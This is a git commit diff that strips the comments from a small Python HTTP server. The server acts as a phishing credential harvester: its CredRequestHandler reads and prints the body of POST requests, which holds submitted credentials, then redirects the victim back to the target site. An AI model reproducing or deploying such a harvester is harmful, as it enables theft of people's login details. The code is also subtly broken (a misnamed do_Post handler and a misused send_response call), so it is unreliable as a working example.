2bc11ea5613b654166b9fda91bdd6dcdd7315771
zedxpace <52217313+zedxpace@users.noreply.github.com>
2022-03-06 11:41:33 +0530

    Update server.py

--- server.py
+++ server.py
@@ -2,16 +2,15 @@ from http.server import SimpleHTTPRequestHandler
 from socketserver import TCPServer
 from urllib.parse import  unquote
 
-class CredRequestHandler( SimpleHTTPRequestHandler ) :          #responsible for handling the HTTP POS requests
+class CredRequestHandler( SimpleHTTPRequestHandler ) :          
     def do_Post(self):
-        content_length = int(self.headers['content-Length'])    #when request is recieved ,read the content-Length header to determine size of request
+        content_length = int(self.headers['content-Length'])    
         print(content_length)
-        creds          = self.rfile.read(content_length).decode('utf-8')    #read coontent of request
-        print(creds)    #print the content of request
-        site = self.path[1:]    #parsing out the originating site
-        self.send_response('Location' ,unquote(site))   #force browser to redirect back to the main page of tagret site
+        creds          = self.rfile.read(content_length).decode('utf-8')    
+        print(creds)    
+        site = self.path[1:]    
+        self.send_response('Location' ,unquote(site))   
         self.end_headers()
 
-#initialize the base TCPserver class with the IP,Port and CredRequesthandler class
 server = TCPServer(('127.0.0.1' ,8080) ,CredRequestHandler)
 server.serve_forever()
